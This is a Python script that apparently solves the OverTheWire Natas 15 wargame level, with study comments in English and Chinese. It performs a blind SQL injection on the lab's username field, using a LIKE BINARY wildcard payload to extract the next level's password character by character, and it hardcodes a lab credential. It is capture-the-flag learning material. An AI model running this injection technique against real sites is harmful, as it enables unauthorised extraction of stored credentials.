import requests
from requests.auth import HTTPBasicAuth

Natas15_psw = 'GB6USCJYJjwLyYhZUNkE1NwDueiTow6g'

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth('natas15', Natas15_psw)

#all 52 chars
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# to store found psw
password = ""

# 4. The Loop
# Natas passwords are exactly 32 characters long.
for i in range(32):
    print(f"trying {i} slot")
    for char in chars:
        # Guess the password so far + the new character + the % wildcard
        # wildcard-狂野卡-癞子牌, 比如linux的*， *.txt指所有txt文件
        # %与_在database里，前者是0或多个字符，后者指某一个
        # xxx%, 查xxx开头后续随意的东西
        guess = password + char + "%"

        # Build the SQL Injection payload
        # this make sure caseSensitive
        payload = 'natas16" AND password LIKE BINARY "' + guess + '" -- '

        # Send the POST request (or GET, depending on the form)
        # Look at the HTML form to see if it uses GET or POST, and what the input name is
        response = requests.post(url, auth=auth, data={"username": payload})


        '''
        <form action="index.php" method="POST">
        Username: <input name="username"><br>
        '''

        # Check if the server said YES
        if "This user exists" in response.text:
            password = password + char
            print("Found a letter! Password so far: " + password)
            break  # Stop checking other characters, move to the next position!

print("Final Password: " + password)
